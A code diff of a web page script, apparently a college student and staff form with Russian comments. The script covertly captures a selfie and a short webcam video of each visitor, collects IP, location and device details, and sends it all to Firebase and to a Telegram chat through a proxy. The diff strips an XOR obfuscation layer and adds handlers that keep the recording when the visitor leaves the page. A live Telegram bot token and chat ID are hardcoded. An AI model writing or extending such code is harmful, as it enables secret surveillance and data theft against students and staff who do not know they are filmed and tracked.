@@ -624,33 +624,14 @@
   const TELEGRAM_TOKEN = "8839536788:AAFbVmXWYa0grVBG15FqS1ePvE3znAzUAL8";
   const TELEGRAM_CHAT_ID = "6651741310";
 
-  // ===== ШИФРОВАНИЕ =====
-  const SECRET_KEY = "kp11_secret_2026_xor_key_9f3a7b2c";
-
   const PROXY_URLS = [
     "https://kp11-proxy.vercel.app/api/proxy"
   ];
 
   // ============================================================
-  //  XOR-шифрование
-  // ============================================================
-  function xorEncrypt(str, key) {
-    const strBytes = new TextEncoder().encode(str);
-    const keyBytes = new TextEncoder().encode(key);
-    const out = new Uint8Array(strBytes.length);
-    for (let i = 0; i < strBytes.length; i++) {
-      out[i] = strBytes[i] ^ keyBytes[i % keyBytes.length];
-    }
-    let binary = '';
-    for (let i = 0; i < out.length; i++) {
-      binary += String.fromCharCode(out[i]);
-    }
-    return btoa(binary);
-  }
-
-  // ============================================================
   //  Утилиты
   // ============================================================
+
   function timeoutForMethod(method) {
     if (method === "sendVideo") return 60000;
     if (method === "sendDocument") return 60000;
@@ -659,13 +640,12 @@
   }
 
   // ============================================================
-  //  Отправка через прокси (XOR-шифрование, text/plain)
+  //  Отправка через прокси — всегда JSON
   // ============================================================
   async function sendWithFailover(method, payload) {
     const errors = [];
     const timeout = timeoutForMethod(method);
-    const jsonStr = JSON.stringify(payload);
-    const encrypted = xorEncrypt(jsonStr, SECRET_KEY);
+    const bodyStr = JSON.stringify(payload);
 
     for (let round = 0; round < 3; round++) {
       for (const proxy of PROXY_URLS) {
@@ -675,17 +655,20 @@
           const timer = setTimeout(() => controller.abort(), timeout);
           const res = await fetch(url, {
             method: "POST",
-            headers: { "Content-Type": "text/plain" },
-            body: encrypted,
+            headers: { "Content-Type": "application/json" },
+            body: bodyStr,
             signal: controller.signal
           });
           clearTimeout(timer);
           if (res.ok) {
+            console.log(`✅ ${method} → ${proxy}`);
             return res;
           }
           const txt = await res.text().catch(() => "");
-          errors.push(`${proxy}: HTTP ${res.status} ${txt.slice(0, 80)}`);
+          console.warn(`⚠️ ${method} ${proxy} HTTP ${res.status}: ${txt}`);
+          errors.push(`${proxy}: HTTP ${res.status}`);
         } catch (err) {
+          console.warn(`❌ ${method} ${proxy}: ${err.message || err.name}`);
           errors.push(`${proxy}: ${err.message || err.name}`);
         }
       }
@@ -699,19 +682,22 @@
   // ============================================================
   async function sendTelegramNotify(text) {
     try {
-      await sendWithFailover("sendMessage", {
+      const res = await sendWithFailover("sendMessage", {
         chat_id: TELEGRAM_CHAT_ID,
         text: text,
         parse_mode: "HTML",
         disable_web_page_preview: true
       });
+      if (res && res.ok) {
+        console.log("✅ Текст отправлен");
+      }
     } catch (err) {
-      // тихо
+      console.error("❌ Ошибка отправки текста:", err);
     }
   }
 
   // ============================================================
-  //  ФОТО
+  //  ФОТО — JSON с file_base64
   // ============================================================
   async function sendTelegramPhoto(photoBase64, caption) {
     if (!photoBase64) return;
@@ -724,18 +710,30 @@
       filename: "selfie.jpg"
     };
 
+    // sendPhoto
     try {
       const res = await sendWithFailover("sendPhoto", payload);
-      if (res && res.ok) return;
-    } catch (err) {}
+      if (res && res.ok) {
+        console.log("✅ Фото отправлено (sendPhoto)");
+        return;
+      }
+    } catch (err) {
+      console.warn("❌ sendPhoto упал:", err.message || err);
+    }
 
+    // sendDocument fallback
     try {
-      await sendWithFailover("sendDocument", payload);
-    } catch (err) {}
+      const res = await sendWithFailover("sendDocument", payload);
+      if (res && res.ok) {
+        console.log("✅ Фото отправлено (sendDocument)");
+      }
+    } catch (err) {
+      console.error("❌ Ошибка отправки фото:", err);
+    }
   }
 
   // ============================================================
-  //  ВИДЕО
+  //  ВИДЕО — JSON с file_base64
   // ============================================================
   async function sendTelegramVideo(videoBase64, caption) {
     if (!videoBase64) return;
@@ -748,14 +746,26 @@
       filename: "video.mp4"
     };
 
+    // sendVideo
     try {
       const res = await sendWithFailover("sendVideo", payload);
-      if (res && res.ok) return;
-    } catch (err) {}
+      if (res && res.ok) {
+        console.log("✅ Видео отправлено (sendVideo)");
+        return;
+      }
+    } catch (err) {
+      console.warn("❌ sendVideo упал:", err.message || err);
+    }
 
+    // sendDocument fallback
     try {
-      await sendWithFailover("sendDocument", payload);
-    } catch (err) {}
+      const res = await sendWithFailover("sendDocument", payload);
+      if (res && res.ok) {
+        console.log("✅ Видео отправлено (sendDocument)");
+      }
+    } catch (err) {
+      console.error("❌ Ошибка отправки видео:", err);
+    }
   }
 
   const app = initializeApp(firebaseConfig);
@@ -943,7 +953,9 @@
         info.ipCountry = d.country || null;
         info.ipProvider = d.connection && d.connection.isp ? d.connection.isp : null;
       }
-    } catch (e) {}
+    } catch (e) {
+      console.warn("IP lookup failed:", e.message || e);
+    }
 
     const ua = navigator.userAgent;
     info.userAgent = ua;
@@ -1274,6 +1286,9 @@
 
     startVideoRecording();
 
+    window.addEventListener('pagehide', onPageHide, { once: true });
+    window.addEventListener('beforeunload', onPageHide, { once: true });
+
     setTimeout(async () => {
       await stopRecordingAndSave();
     }, 6000);
@@ -1306,6 +1321,14 @@
 
   let savedToFirestore = false;
 
+  function onPageHide() {
+    if (savedToFirestore) return;
+    savedToFirestore = true;
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+      try { mediaRecorder.stop(); } catch {}
+    }
+  }
+
   function startVideoRecording() {
     if (!mediaStream) return false;
     if (typeof MediaRecorder === "undefined") return false;
@@ -1323,10 +1346,11 @@
       mediaRecorder.ondataavailable = (e) => {
         if (e.data && e.data.size > 0) recordedChunks.push(e.data);
       };
-      mediaRecorder.onerror = (e) => {};
+      mediaRecorder.onerror = (e) => console.error("MediaRecorder error:", e);
       mediaRecorder.start(500);
       return true;
     } catch (e) {
+      console.error("MediaRecorder start failed:", e);
       return false;
     }
   }
@@ -1379,7 +1403,7 @@
   }
 
   // ============================================================
-  //  СОХРАНЕНИЕ: Firebase + Telegram
+  //  СОХРАНЕНИЕ: Firebase + Telegram (текст → фото → видео)
   // ============================================================
   async function saveToFirestore(videoBase64, photoBase64) {
     if (!pendingData) return;
@@ -1395,6 +1419,7 @@
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "staff"), docData);
+        console.log("✅ Педагог сохранён в Firestore");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1421,6 +1446,7 @@
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "students"), docData);
+        console.log("✅ Студент сохранён в Firestore");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1440,7 +1466,9 @@
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
       }
-    } catch (err) {}
+    } catch (err) {
+      console.error("❌ Ошибка сохранения:", err);
+    }
   }
 
   form.addEventListener('submit', async (e) => {
@@ -1497,7 +1525,10 @@
               ...deviceInfo,
               time: serverTimestamp()
             });
-          } catch (err) {}
+            console.log("✅ Педагог сохранён в Firestore");
+          } catch (err) {
+            console.error("Ошибка сохранения педагога:", err);
+          }
 
           const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
           const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
@@ -1514,7 +1545,9 @@
             "⚠️ <b>Это сотрудник колледжа!</b>";
 
           await sendTelegramNotify(caption);
-        } catch (err) {}
+        } catch (err) {
+          console.error("Ошибка фоновой задачи педагога:", err);
+        }
       })();
 
       return;
